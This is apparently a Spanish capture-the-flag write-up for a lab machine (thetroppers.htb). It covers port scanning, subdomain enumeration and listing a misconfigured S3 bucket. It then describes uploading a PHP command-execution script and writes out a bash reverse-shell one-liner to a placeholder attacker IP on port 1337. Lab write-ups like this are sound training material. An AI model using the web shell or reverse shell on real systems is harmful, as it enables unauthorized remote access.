
Primero de todo hacemos un ping a la máquina para comprobar que tenemos conectividad con ella

![[Pasted image 20230814123446.png]]

En este caso si tenemos, y vemos una ttl de 63, por lo que es una máquina Linux

Ahora vamos a realizar el escaneo de puertos

![[Pasted image 20230814123649.png]]

Vemos que tiene abiertos los puertos 22 y 80. El puerto 22 pertenece al servicio ssh, pero ahora veremos la página web a ver que encontramos

![[Pasted image 20230814123809.png]]

Ahora indagamos un poco en la página web.

Ahora vamos a utilizar gobuster para buscar alguna página relacionada

No hemos encontrado nada relevante

***IMPORTANTE***

Hemos encontrado el dominio de correo thetroppers.htb, esto podemos usarlo para redireccionarlo mediante /etc/hosts con la ip que tenemos para ver la web que sale.

Y ahora probamos gobuster de nuevo pero con esta dirección.

***IMPORTANTE***

Hay que cambiar la lista a usar, ya que queremos buscar subdominios en esta ocasión.

![[Pasted image 20230814125047.png]]

Este sería el comando usado
Y este el resultado

![[Pasted image 20230814125137.png]]


Ahora metemos el subdominio al /etc/hosts.

Y nos sale esto

![[Pasted image 20230814125325.png]]


Para interactuar con se bucket, hay que instalar awscli.

Para configurar el aws CLI installation, usamos aws configure.

Lo instalamos y utilizamos lo siguiente para listar las cosas

![[Pasted image 20230814125710.png]]

Ahora creamos un script en php para comprobar si podemos ejecutar comandos dentro del s3:

![[Pasted image 20231102104524.png]]

![[Pasted image 20231102104702.png]]

De esta manera le subimos en script en php y ahora vamos a comprobar si ha funcionado:

![[Pasted image 20231102104739.png]]

En este caso esta vacío por un fallo mío pero si que deja subir scripts, por lo que ahora subiremos uno que nos de una bash.
*NOTA*

No es fallo mío, es que para ejecutar había que modificar la url:

![[Pasted image 20231102104905.png]]

En este caso no ejecuta id, pero podemos ejecutar otros comandos para comprobar:

![[Pasted image 20231102104946.png]]

Y ahora vamos a enviarnos una bash por un puerto nuestro:

bash -i >& /dev/tcp/<YOUR_IP_ADDRESS>/1337 0>&1

Este es el script que se suele utilizar, y el cual vamos a ejecutar.

Vamos a crear el script primero:

![[Pasted image 20231102105324.png]]

Ahora ya lo tenemos creado. Y como vemos, nos vamos a pasar la shell por el puerto 1337, por lo que tendremos que ponernos en escucha por este puerto en otra terminal:

![[Pasted image 20231102105417.png]]

Y ahora hay que ponerse en escucha por otro puerto con python3: 

![[Pasted image 20231102105625.png]]

Y ejecutamos lo siguiente:

![[Pasted image 20231102105644.png]]

***Importante***

Hay que ejecutar el server de python justo donde tenemos ubicado shell.sh

Una vez ejecutado nos sale lo siguiente:

![[Pasted image 20231102105847.png]]

Y ya tenemos acceso a la máquina:

![[Pasted image 20231102105943.png]]

Y ahí encontramos la flag.




